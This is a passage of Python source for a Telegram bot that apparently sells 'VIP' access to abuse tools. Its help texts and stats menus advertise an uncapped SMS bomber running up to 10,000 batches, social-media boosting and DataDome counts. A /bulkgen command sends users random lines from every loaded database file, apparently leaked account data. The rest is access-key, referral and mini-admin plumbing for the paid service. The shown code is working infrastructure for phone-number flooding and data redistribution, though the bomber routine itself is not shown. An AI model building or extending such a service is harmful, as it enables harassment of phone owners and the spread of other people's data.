    streak       = stats.get("checkin_streak", 0)
    joined_str   = stats.get("joined", "unknown")[:10]
    last_str     = stats.get("last_active", "unknown")[:16].replace("T", " ")
    refs         = REFERRAL_DATA.get(user_id, {}).get("referred", [])
    pts          = REFERRAL_DATA.get(user_id, {}).get("points", 0)

    text = (
        f"📊 *VIP ᴀɴᴀʟʏᴛɪᴄs*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 `{user_id}`  ·  ⏳ `{days_left}` ʟᴇғᴛ\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📅 *ᴛᴏᴅᴀʏ*\n"
        f"┣ 💣 ʙᴏᴍʙ ʀᴜɴs: `{bombs_today}` *(ᴜɴʟɪᴍɪᴛᴇᴅ)*\n"
        f"┗ 📂 ɢᴇɴᴇʀᴀᴛɪᴏɴs: `{gen_today}` *(ᴜɴʟɪᴍɪᴛᴇᴅ)*\n\n"
        f"📈 *ʟɪғᴇᴛɪᴍᴇ*\n"
        f"┣ 💣 ᴛᴏᴛᴀʟ ʙᴏᴍʙs: `{total_bombs:,}`\n"
        f"┣ 📂 ᴛᴏᴛᴀʟ ɢᴇɴs: `{total_gens:,}`\n"
        f"┣ 🚀 ᴛᴏᴛᴀʟ ʙᴏᴏsᴛs: `{total_boosts:,}`\n"
        f"┣ 🔐 ᴇɴᴄʀʏᴘᴛɪᴏɴs: `{total_encs:,}`\n"
        f"┣ 🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇs: `{total_dd:,}`\n"
        f"┣ 🔥 sᴛʀᴇᴀᴋ: `{streak} ᴅᴀʏs`\n"
        f"┣ 🔗 ʀᴇғᴇʀʀᴀʟs: `{len(refs)}` · `{pts} ᴘᴛs`\n"
        f"┣ 📅 ᴊᴏɪɴᴇᴅ: `{joined_str}`\n"
        f"┗ 🕐 ʟᴀsᴛ sᴇᴇɴ: `{last_str}`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ VIP ᴍᴇɴᴜ", callback_data="vip_menu_cb")]])
    await update.effective_message.reply_text(text, reply_markup=kb, parse_mode="Markdown")


# ─── /bulkgen ─────────────────────────────────────────────────────
@_vip_gate
async def bulkgen_command(update: Update, context: CallbackContext):
    """/bulkgen — generate lines from ALL databases at once (VIP only)"""
    user_id = update.effective_user.id
    if not DATABASE_FILES:
        await update.effective_message.reply_text("❌ No databases loaded.", parse_mode="Markdown")
        return
    msg = await update.effective_message.reply_text(
        "📋 *ʙᴜʟᴋ ɢᴇɴᴇʀᴀᴛᴇ*\n━━━━━━━━━━━━━━━━━━━━\n⏳ Generating from all databases...",
        parse_mode="Markdown"
    )
    results = []
    for db_name, db_path in DATABASE_FILES.items():
        try:
            if not os.path.exists(db_path):
                continue
            with open(db_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f if l.strip()]
            if not lines:
                continue
            sample = random.choice(lines)
            clean = db_name.replace("• ", "")
            results.append(f"📁 *{clean}*\n`{sample}`")
        except Exception:
            continue

    if not results:
        await safe_edit(msg, "❌ No data found in any database.", parse_mode="Markdown")
        return

    USER_STATS.setdefault(user_id, {})["generations"] = USER_STATS.get(user_id, {}).get("generations", 0) + len(results)
    schedule_save()
    out_path = GENERATED_DIR / f"bulkgen_{user_id}_{int(time.time())}.txt"
    with open(out_path, "w", encoding="utf-8") as f:
        for r in results:
            # strip markdown for the file
            f.write(r.replace("*", "").replace("`", "") + "\n\n")

    text = f"📋 *ʙᴜʟᴋ ɢᴇɴᴇʀᴀᴛᴇ* — {len(results)} ᴅʙs\n━━━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(results[:20])
    if len(results) > 20:
        text += f"\n\n_...and {len(results)-20} more in file_"
    try:
        await safe_edit(msg, text[:4000], parse_mode="Markdown")
        with open(out_path, "rb") as f:
            await update.message.reply_document(
                document=InputFile(f, filename=f"bulkgen_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"),
                caption="📋 ʙᴜʟᴋ ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴍᴘʟᴇᴛᴇ"
            )
    except Exception as e:
        logging.warning(f"bulkgen send error: {e}")
    try:
        out_path.unlink()
    except Exception:
        pass


# ─── /vipperks ────────────────────────────────────────────────────
@_vip_gate
async def vipperks_command(update: Update, context: CallbackContext):
    """/vipperks — show all VIP perks and limits"""
    user_id = update.effective_user.id
    exp = USER_ACCESS.get(user_id)
    now_ts = datetime.datetime.now().timestamp()
    days_left = "♾️ Lifetime" if exp is None else f"{max(0, int((exp - now_ts) / 86400))} days left"
    text = (
        "💎 *YOUR VIP PERKS*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "♾️ *ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴄᴄᴇss*\n"
        "┣ 💣 SMS Bomb — no daily cap\n"
        "┣ 📂 DB Generate — no daily cap\n"
        "┗ 🚀 Social Boost — no daily cap\n\n"
        "💪 *ᴘᴏᴡᴇʀ ʙᴏᴏsᴛs*\n"
        "┣ 💣 Bomber up to 10,000 batches\n"
        "┣ 📋 /bulkgen — all DBs at once\n"
        "┣ 📊 /vipstats — full analytics\n"
        "┣ 💎 /vipmenu — VIP panel\n"
        "┗ 🎯 /vipperks — this menu\n\n"
        f"⏳ *Your access:* `{days_left}`\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📞 @ZyronDevv "
    )
    await update.effective_message.reply_text(text, parse_mode="Markdown")


# ─── /checkup — personal usage health check ───────────────────────
@_vip_gate
async def checkup_command(update: Update, context: CallbackContext):
    """/checkup — VIP-only account health & usage summary"""
    user_id = update.effective_user.id
    stats = USER_STATS.get(user_id, {})
    reset_daily_stats_if_needed(user_id)
    now_ts = datetime.datetime.now().timestamp()
    exp = USER_ACCESS.get(user_id)
    days_left = "♾️" if exp is None else max(0, int((exp - now_ts) / 86400))
    bombs_today = stats.get("sms_bomb_today", 0)
    gen_today   = stats.get("generate_today", 0)

    # Health indicators
    def _bar(val, max_val=10):
        filled = min(10, int(val / max(max_val, 1) * 10))
        return "🟩" * filled + "⬜" * (10 - filled)

    bomb_bar = _bar(min(bombs_today, 10), 10)
    gen_bar  = _bar(min(gen_today, 10), 10)
    streak   = stats.get("checkin_streak", 0)
    pts      = REFERRAL_DATA.get(user_id, {}).get("points", 0)

    text = (
        f"🔍 *ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴜᴘ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 `{user_id}`\n"
        f"⏳ ᴀᴄᴄᴇss: `{days_left}` ᴅᴀʏs\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 *ᴛᴏᴅᴀʏ's ᴀᴄᴛɪᴠɪᴛʏ*\n"
        f"💣 ʙᴏᴍʙ ʀᴜɴs:  `{bombs_today}` *(ᴜɴʟɪᴍɪᴛᴇᴅ)*\n"
        f"  {bomb_bar}\n"
        f"📂 ɢᴇɴᴇʀᴀᴛɪᴏɴs: `{gen_today}` *(ᴜɴʟɪᴍɪᴛᴇᴅ)*\n"
        f"  {gen_bar}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🏆 *ᴀᴄᴄᴏᴜɴᴛ sᴄᴏʀᴇ*\n"
        f"🔥 ᴄʜᴇᴄᴋ-ɪɴ sᴛʀᴇᴀᴋ: `{streak} ᴅᴀʏs`\n"
        f"🔗 ʀᴇғᴇʀʀᴀʟ ᴘᴏɪɴᴛs: `{pts} ᴘᴛs`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    await update.effective_message.reply_text(text, parse_mode="Markdown")


# ─── /viphelp ─────────────────────────────────────────────────────
@_vip_gate
async def viphelp_command(update: Update, context: CallbackContext):
    """/viphelp — all VIP-exclusive commands"""
    text = (
        "💎 *VIP ᴇxᴄʟᴜsɪᴠᴇ ᴄᴏᴍᴍᴀɴᴅs*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎛️ *ᴘᴀɴᴇʟs*\n"
        "`/vipmenu` — VIP control panel\n"
        "`/vipperks` — your perks & limits\n"
        "`/viphelp` — this help menu\n\n"
        "📊 *ᴀɴᴀʟʏᴛɪᴄs*\n"
        "`/vipstats` — full usage analytics\n"
        "`/checkup` — account health check\n\n"
        "⚡ *ᴘᴏᴡᴇʀ ᴛᴏᴏʟs*\n"
        "`/bulkgen` — generate from ALL databases\n\n"
        "♾️ *ᴜɴʟɪᴍɪᴛᴇᴅ ᴀᴄᴄᴇss ᴠɪᴀ ᴍᴇɴᴜ*\n"
        "┣ 💣 SMS Bomber — no daily cap\n"
        "┣ 📂 DB Generator — no daily cap\n"
        "┗ 🚀 Social Booster — no daily cap\n\n"
        "💣 *ʙᴏᴍʙᴇʀ ᴜᴘɢʀᴀᴅᴇ*\n"
        "Max batches raised to *10,000*\n"
        "(basic users capped at 200)\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📞 @ZyronDevv "
    )
    await update.effective_message.reply_text(text, parse_mode="Markdown")


# ─── Callback: vip_stats, vip_bulkgen, vip_checkup, vip_menu_cb ──
async def _handle_vip_callbacks(update: Update, context: CallbackContext):
    """Inline-button versions of VIP commands."""
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = update.effective_user.id

    if not is_at_least_role(user_id, "vip"):
        await query.answer("💎 VIP only!", show_alert=True)
        return

    if data == "vip_menu_cb":
        await vipmenu_command(update, context)

    elif data == "vip_stats":
        # Re-use vipstats logic inline
        stats = USER_STATS.get(user_id, {})
        reset_daily_stats_if_needed(user_id)
        now_ts = datetime.datetime.now().timestamp()
        exp = USER_ACCESS.get(user_id)
        days_left = "♾️" if exp is None else f"{max(0, int((exp - now_ts) / 86400))}d"
        text = (
            f"📊 *VIP ᴀɴᴀʟʏᴛɪᴄs*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 `{user_id}`  ·  ⏳ `{days_left}` ʟᴇғᴛ\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💣 ʙᴏᴍʙs ᴛᴏᴅᴀʏ: `{stats.get('sms_bomb_today',0)}` *(♾️)*\n"
            f"📂 ɢᴇɴs ᴛᴏᴅᴀʏ: `{stats.get('generate_today',0)}` *(♾️)*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📈 ʟɪғᴇᴛɪᴍᴇ ᴛᴏᴛᴀʟs\n"
            f"┣ 💣 `{stats.get('sms_bomb_count',0):,}` ʙᴏᴍʙs\n"
            f"┣ 📂 `{stats.get('generations',0):,}` ɢᴇɴs\n"
            f"┣ 🚀 `{stats.get('boost_count',0):,}` ʙᴏᴏsᴛs\n"
            f"┗ 🔐 `{stats.get('encrypt_count',0):,}` ᴇɴᴄs\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ VIP ᴍᴇɴᴜ", callback_data="vip_menu_cb")]])
        await safe_edit(query.message, text, reply_markup=kb, parse_mode="Markdown")

    elif data == "vip_checkup":
        stats = USER_STATS.get(user_id, {})
        reset_daily_stats_if_needed(user_id)
        now_ts = datetime.datetime.now().timestamp()
        exp = USER_ACCESS.get(user_id)
        days_left = "♾️" if exp is None else max(0, int((exp - now_ts) / 86400))
        bombs_today = stats.get("sms_bomb_today", 0)
        gen_today   = stats.get("generate_today", 0)
        def _bar(val, mv=10):
            f = min(10, int(val / max(mv, 1) * 10))
            return "🟩" * f + "⬜" * (10 - f)
        text = (
            f"🔍 *ᴀᴄᴄᴏᴜɴᴛ ᴄʜᴇᴄᴋᴜᴘ*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 `{user_id}`  ·  ⏳ `{days_left}d`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"💣 ʙᴏᴍʙ ʀᴜɴs: `{bombs_today}` *(♾️)*\n{_bar(min(bombs_today,10))}\n"
            f"📂 ɢᴇɴs: `{gen_today}` *(♾️)*\n{_bar(min(gen_today,10))}\n"
            f"━━━━━━━━━━━━━━━━━━━━"
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ VIP ᴍᴇɴᴜ", callback_data="vip_menu_cb")]])
        await safe_edit(query.message, text, reply_markup=kb, parse_mode="Markdown")

    elif data == "vip_bulkgen":
        # Redirect to bulkgen — simulate a message update for bulkgen_command
        if not DATABASE_FILES:
            await safe_edit(query.message, "❌ No databases loaded.", parse_mode="Markdown")
            return
        results = []
        for db_name, db_path in DATABASE_FILES.items():
            try:
                if not os.path.exists(db_path): continue
                with open(db_path, "r", encoding="utf-8", errors="ignore") as f:
                    lines = [l.strip() for l in f if l.strip()]
                if not lines: continue
                sample = random.choice(lines)
                clean = db_name.replace("• ", "")
                results.append(f"📁 *{clean}*\n`{sample}`")
            except Exception:
                continue
        if not results:
            await safe_edit(query.message, "❌ No data found.", parse_mode="Markdown")
            return
        USER_STATS.setdefault(user_id, {})["generations"] = USER_STATS.get(user_id, {}).get("generations", 0) + len(results)
        schedule_save()
        text = f"📋 *ʙᴜʟᴋ ɢᴇɴᴇʀᴀᴛᴇ* — {len(results)} ᴅʙs\n━━━━━━━━━━━━━━━━━━━━\n" + "\n\n".join(results[:20])
        if len(results) > 20:
            text += f"\n\n_...and {len(results)-20} more_"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ VIP ᴍᴇɴᴜ", callback_data="vip_menu_cb")]])
        await safe_edit(query.message, text[:4000], reply_markup=kb, parse_mode="Markdown")

    elif data == "vip_multiboost":
        text = (
            "🎯 *ᴍᴜʟᴛɪ ʙᴏᴏsᴛ*\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "ᴜsᴇ ᴛʜᴇ ʙᴏᴏsᴛᴇʀ ᴍᴇɴᴜ ᴛᴏ sᴇɴᴅ ᴍᴜʟᴛɪᴘʟᴇ ʙᴏᴏsᴛs.\n"
            "ᴀs ᴀ *VIP* ᴍᴇᴍʙᴇʀ ʏᴏᴜ ʜᴀᴠᴇ ɴᴏ ᴅᴀɪʟʏ ᴄᴀᴘ —\n"
            "ʀᴜɴ ᴀs ᴍᴀɴʏ ʙᴏᴏsᴛs ᴀs ʏᴏᴜ ɴᴇᴇᴅ.\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🚀 ɢᴏ ᴛᴏ ʙᴏᴏsᴛᴇʀ", callback_data="social_media_booster_menu")],
            [InlineKeyboardButton("⬅️ VIP ᴍᴇɴᴜ", callback_data="vip_menu_cb")],
        ])
        await safe_edit(query.message, text, reply_markup=kb, parse_mode="Markdown")

    elif data == "vip_export":
        stats = USER_STATS.get(user_id, {})
        reset_daily_stats_if_needed(user_id)
        now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        exp = USER_ACCESS.get(user_id)
        exp_str = "Lifetime" if exp is None else datetime.datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")
        lines = [
            f"ZYRON VIP TOOLS — Stats Export",
            f"Generated: {now_str}",
            f"User ID:   {user_id}",
            f"Role:      {USER_ROLES.get(user_id, 'vip').upper()}",
            f"Expiry:    {exp_str}",
            f"",
            f"=== LIFETIME TOTALS ===",
            f"DB Generations:  {stats.get('generations', 0):,}",
            f"SMS Bombs:       {stats.get('sms_bomb_count', 0):,}",
            f"Social Boosts:   {stats.get('boost_count', 0):,}",
            f"Encryptions:     {stats.get('encrypt_count', 0):,}",
            f"DataDomes:       {stats.get('datadome_count', 0):,}",
            f"Check-in streak: {stats.get('checkin_streak', 0)} days",
            f"Referrals:       {len(REFERRAL_DATA.get(user_id,{}).get('referred',[]))}",
            f"Points:          {REFERRAL_DATA.get(user_id,{}).get('points',0)}",
        ]
        out_path = GENERATED_DIR / f"vip_stats_{user_id}_{int(time.time())}.txt"
        with open(out_path, "w") as f:
            f.write("\n".join(lines))
        try:
            with open(out_path, "rb") as f:
                await query.message.reply_document(
                    document=InputFile(f, filename=f"vip_stats_{user_id}.txt"),
                    caption="📁 *Your VIP stats export*",
                    parse_mode="Markdown"
                )
        except Exception as e:
            await query.message.reply_text(f"❌ Export failed: {e}")
        try:
            out_path.unlink()
        except Exception:
            pass

# ========== MAIN FUNCTION ==========
PID_FILE = "renzo_bot.pid"

import fcntl

def _acquire_pid_lock():
    """Prevent multiple bot instances using an exclusive file lock."""
    global _lock_file
    
    # Use a separate lock file
    lock_path = "renzo_bot.lock"
    
    # Try to acquire an exclusive lock
    try:
        _lock_file = open(lock_path, 'w')
        fcntl.flock(_lock_file, fcntl.LOCK_EX | fcntl.LOCK_NB)
        # Write the PID to the lock file
        _lock_file.write(str(os.getpid()))
        _lock_file.flush()
        return True
    except (OSError, IOError, BlockingIOError):
        print("[ERROR] Bot already running. Stop the other instance first.")
        return False

def _release_pid_lock():
    try:
        if '_lock_file' in globals() and _lock_file:
            fcntl.flock(_lock_file, fcntl.LOCK_UN)
            _lock_file.close()
            os.remove("renzo_bot.lock")
    except Exception:
        pass


# ════════════════════════════════════════════════════════════════════════════
# USER QoL COMMANDS
# ════════════════════════════════════════════════════════════════════════════

async def redeem_command(update: Update, context: CallbackContext):
    """/redeem <KEY> — redeem a key directly from command line"""
    user_id = update.effective_user.id
    if not context.args:
        await update.effective_message.reply_text(
            "💡 *ᴜsᴀɢᴇ:* `/redeem ZYRON-XXXX-XXXX-XXXX`",
            parse_mode="Markdown"
        )
        return
    key = context.args[0].strip().upper()
    # Store key so handle_enter_key can read it without mutating update.message.text
    # (PTB 20+ raises AttributeError if you try to set Message.text directly)
    context.user_data["_injected_key"] = key
    AWAITING_KEY_INPUT.add(user_id)
    await handle_enter_key(update, context)

async def refer_command(update: Update, context: CallbackContext):
    """/refer — show your referral link"""
    user_id = update.effective_user.id
    bot_info = await context.bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=ref_{user_id}"
    ref_count = REFERRAL_STATS.get(user_id, {}).get("count", 0) if "REFERRAL_STATS" in dir() else 0
    await update.effective_message.reply_text(
        f"🔗 *ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"`{link}`\n\n"
        f"👥 ʀᴇғᴇʀʀᴀʟs: *{ref_count}*\n\n"
        f"sʜᴀʀᴇ ᴛʜɪs ʟɪɴᴋ ᴛᴏ ᴇᴀʀɴ ʙᴏɴᴜs ᴛɪᴍᴇ!",
        parse_mode="Markdown"
    )

async def checkin_command(update: Update, context: CallbackContext):
    """/checkin — daily check-in for bonus points"""
    user_id = update.effective_user.id
    today     = datetime.date.today().isoformat()
    yesterday = (datetime.date.today() - datetime.timedelta(days=1)).isoformat()
    stats = USER_STATS.setdefault(user_id, {"generations": 0})
    last_checkin = stats.get("last_checkin")

    if last_checkin == today:
        await update.effective_message.reply_text(
            "⏳  *Already Checked In*\n"
            "Come back tomorrow for your next check-in!",
            parse_mode="Markdown"
        )
        return

    # ── Consecutive-day streak check (#9) ───────────────────────
    broken_msg = ""
    if last_checkin == yesterday or last_checkin is None:
        streak = stats.get("checkin_streak", 0) + 1
    else:
        # Streak broken — reset to 1
        streak = 1
        if last_checkin and last_checkin != today:
            broken_msg = "\n💔 *sᴛʀᴇᴀᴋ ʙʀᴏᴋᴇɴ!* ʏᴏᴜ ᴍɪssᴇᴅ ᴀ ᴅᴀʏ. sᴛᴀʀᴛɪɴɢ ғʀᴇsʜ ғʀᴏᴍ 1."

    stats["last_checkin"]    = today
    stats["checkin_streak"]  = streak
    schedule_save()

    # Milestone rewards
    reward_msg = ""
    if streak % 7 == 0:
        reward_msg = f"\n🎁 *7-ᴅᴀʏ sᴛʀᴇᴀᴋ ʙᴏɴᴜs!* ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ᴄʟᴀɪᴍ."
    await update.effective_message.reply_text(
        f"✅  *DAILY CHECK-IN*\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"🔥  Streak  ›  *{streak} day{'s' if streak != 1 else ''}*\n"
        f"📅  Date    ›  `{today}`"
        f"{broken_msg}{reward_msg}",
        parse_mode="Markdown"
    )

async def profile_command(update: Update, context: CallbackContext):
    """/profile — your full profile card"""
    user_id  = update.effective_user.id
    user     = update.effective_user
    now_ts   = time.time()
    role     = USER_ROLES.get(user_id, "user")
    access   = USER_ACCESS.get(user_id)
    stats    = USER_STATS.get(user_id, {})
    warns    = len(USER_WARNINGS.get(user_id, []))
    streak   = stats.get("checkin_streak", 0)

    if access is None and user_id in USER_ACCESS:
        access_str = "♾️ ʟɪғᴇᴛɪᴍᴇ"
        bar = "🟩" * 10
    elif access and access > now_ts:
        days_left = int((access - now_ts) / 86400)
        expire_dt = datetime.datetime.fromtimestamp(access).strftime("%b %d, %Y")
        access_str = f"✅ {days_left}d (ᴇxᴘ {expire_dt})"
        filled = min(10, max(1, int(days_left / 30 * 10)))
        bar = "🟩" * filled + "⬜" * (10 - filled)
    else:
        access_str = "❌ ɴᴏ ᴀᴄᴄᴇss"
        bar = "⬜" * 10

    role_emoji = {"owner": "👑", "reseller": "💼", "user": "👤"}.get(role, "👤")
    text = (
        f"╔══════════════════════════╗\n"
        f"║  {role_emoji}  ᴍʏ ᴘʀᴏғɪʟᴇ  ║\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 *{escape_md(user.first_name)}* (`{user_id}`)\n"
        f"🏷️ ʀᴏʟᴇ    : `{role}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 ᴀᴄᴄᴇss  : {access_str}\n"
        f"📊 `{bar}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📂 ɢᴇɴs     : *{stats.get('generations', 0):,}*\n"
        f"🔥 sᴛʀᴇᴀᴋ   : *{streak} ᴅᴀʏs*\n"
        f"⚠️ ᴡᴀʀɴs    : *{warns}*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 /checkin ᴅᴀɪʟʏ | /refer ᴛᴏ ᴇᴀʀɴ"
    )
    keyboard = [
        [InlineKeyboardButton("📊 sᴛᴀᴛs", callback_data="show_stats"),
         InlineKeyboardButton("🔑 ᴍʏ ᴋᴇʏ", callback_data="show_mykey"),
         InlineKeyboardButton("🔗 ʀᴇғᴇʀ", callback_data="show_refer")],
        [InlineKeyboardButton("⬅️ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")],
    ]
    await update.effective_message.reply_text(text, parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(keyboard))

async def report_command(update: Update, context: CallbackContext):
    """/report <message> — report an issue to the admin"""
    user_id = update.effective_user.id
    if not context.args:
        await update.effective_message.reply_text(
            "ᴜsᴀɢᴇ: `/report ʏᴏᴜʀ ɪssᴜᴇ ʜᴇʀᴇ`\n\n"
            "ᴇxᴀᴍᴘʟᴇ: `/report ɢᴇɴᴇʀᴀᴛᴇ ʙᴜᴛᴛᴏɴ ɴᴏᴛ ᴡᴏʀᴋɪɴɢ`",
            parse_mode="Markdown"
        )
        return
    msg = " ".join(context.args)
    user = update.effective_user
    ts = datetime.datetime.now().strftime("%b %d %H:%M")
    # Store in feedback log
    FEEDBACK_LOG.append({
        "uid": user_id, "name": user.full_name,
        "username": user.username or "N/A",
        "text": f"[REPORT] {msg[:200]}", "ts": ts
    })
    if len(FEEDBACK_LOG) > FEEDBACK_LOG_MAX:
        FEEDBACK_LOG.pop(0)
    # Alert owner — send header with Markdown, then raw user text without parse_mode
    # so underscores/asterisks in usernames or report text can't break the parser
    _uname = escape_md(f"@{user.username}") if user.username else "N/A"
    try:
        await context.bot.send_message(
            ADMIN_ID,
            f"🆘 *ᴜsᴇʀ ʀᴇᴘᴏʀᴛ*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 `{user_id}` — {_uname}\n"
            f"🕐 {ts}\n"
            f"📝",
            parse_mode="Markdown"
        )
        await context.bot.send_message(ADMIN_ID, msg[:300])
    except Exception: pass
    await update.effective_message.reply_text(
        "✅ *ʀᴇᴘᴏʀᴛ sᴇɴᴛ!*\n"
        "ᴛʜᴀɴᴋ ʏᴏᴜ! ᴛʜᴇ ᴀᴅᴍɪɴ ʜᴀs ʙᴇᴇɴ ɴᴏᴛɪғɪᴇᴅ.",
        parse_mode="Markdown"
    )

# ════════════════════════════════════════════════════════════════════════════
# MINI-ADMIN SYSTEM
# ════════════════════════════════════════════════════════════════════════════
# Stores: MINI_ADMINS[user_id] = set of allowed permission strings
# Permissions: "approve","genkey","delkey","warn","ban","unban","lookup",
#              "activeusers","expiring","globalstats","notes","setquota",
#              "resetstats","backup","feedbacks","broadcast","addtool"
MINI_ADMINS: dict = {}   # user_id -> set of permission strings

ALL_PERMISSIONS = [
    "approve", "genkey", "delkey", "warn", "ban", "unban",
    "lookup", "activeusers", "expiring", "globalstats", "notes",
    "setquota", "resetstats", "backup", "feedbacks", "broadcast", "addtool",
]

def has_perm(user_id: int, perm: str) -> bool:
    """Check if user is owner OR mini-admin with the given permission."""
    if is_at_least_role(user_id, "owner"):
        return True
    return perm in MINI_ADMINS.get(user_id, set())

async def miniadmin_command(update: Update, context: CallbackContext):
    """/miniadmin <user_id> — view permissions for a mini-admin"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    if not context.args:
        # List all mini-admins
        if not MINI_ADMINS:
            await update.effective_message.reply_text("📭 No mini-admins set.\n\nUse `/setperm <uid> <perm>` to add one.", parse_mode="Markdown"); return
        lines = ["👑 *ᴍɪɴɪ-ᴀᴅᴍɪɴs*\n━━━━━━━━━━━━━━━━━━━━"]
        for uid, perms in MINI_ADMINS.items():
            lines.append(f"• `{uid}` — {', '.join(sorted(perms)) or 'no perms'}")
        await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown"); return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return
    perms = MINI_ADMINS.get(target, set())
    active = [f"✅ `{p}`" for p in ALL_PERMISSIONS if p in perms]
    inactive = [f"⬜ `{p}`" for p in ALL_PERMISSIONS if p not in perms]
    text = (
        f"👑 *ᴍɪɴɪ-ᴀᴅᴍɪɴ ᴘᴇʀᴍɪssɪᴏɴs*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 `{target}`\n\n"
        f"*ᴀʟʟᴏᴡᴇᴅ:*\n" + ("\n".join(active) or "none") + "\n\n"
        f"*ʙʟᴏᴄᴋᴇᴅ:*\n" + ("\n".join(inactive) or "none")
    )
    keyboard = [[
        InlineKeyboardButton("➕ ᴀᴅᴅ ᴀʟʟ", callback_data=f"madmin_grantall_{target}"),
        InlineKeyboardButton("🗑️ ʀᴇᴍᴏᴠᴇ ᴀʟʟ", callback_data=f"madmin_revokeall_{target}"),
    ]]
    await update.effective_message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))


async def setperm_command(update: Update, context: CallbackContext):
    """/setperm <user_id> <perm|all> — grant a mini-admin permission"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    args = context.args
    if len(args) < 2:
        await update.effective_message.reply_text(
            f"ᴜsᴀɢᴇ: `/setperm <uid> <perm|all>`\n\n"
            f"*ᴀᴠᴀɪʟᴀʙʟᴇ ᴘᴇʀᴍs:*\n`{'`, `'.join(ALL_PERMISSIONS)}`",
            parse_mode="Markdown"); return
    try:
        target = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return
    perm = args[1].lower()
    if perm == "all":
        MINI_ADMINS[target] = set(ALL_PERMISSIONS)
        await update.effective_message.reply_text(f"✅ `{target}` granted *all* permissions.", parse_mode="Markdown")
    elif perm in ALL_PERMISSIONS:
        MINI_ADMINS.setdefault(target, set()).add(perm)
        await update.effective_message.reply_text(f"✅ `{target}` granted `{perm}`.", parse_mode="Markdown")
    else:
        await update.effective_message.reply_text(f"❌ Unknown perm `{perm}`.\nValid: `{'`, `'.join(ALL_PERMISSIONS)}`", parse_mode="Markdown")
    await log_to_channel(context.bot, f"🔧 SETPERM `{target}` → `{perm}` by `{caller}`")


async def rmperm_command(update: Update, context: CallbackContext):
    """/rmperm <user_id> [perm|all] — revoke a mini-admin permission"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    args = context.args
    if not args:
        await update.effective_message.reply_text("ᴜsᴀɢᴇ: `/rmperm <uid> [perm|all]`", parse_mode="Markdown"); return
    try:
        target = int(args[0])
    except ValueError:
        await update.effective_message.reply_text("❌ Invalid user ID.", parse_mode="Markdown"); return
    perm = args[1].lower() if len(args) > 1 else "all"
    if perm == "all":
        MINI_ADMINS.pop(target, None)
        await update.effective_message.reply_text(f"🗑️ All permissions revoked from `{target}`.", parse_mode="Markdown")
    else:
        MINI_ADMINS.get(target, set()).discard(perm)
        await update.effective_message.reply_text(f"🗑️ Removed `{perm}` from `{target}`.", parse_mode="Markdown")
    await log_to_channel(context.bot, f"🔧 RMPERM `{target}` → `{perm}` by `{caller}`")


async def listadmins_command(update: Update, context: CallbackContext):
    """/listadmins — list all owners, resellers, and mini-admins"""
    caller = update.effective_user.id
    if not is_at_least_role(caller, "owner"):
        await update.effective_message.reply_text("❌ Owner only.", parse_mode="Markdown"); return
    owners    = [uid for uid, r in USER_ROLES.items() if r == "owner"]
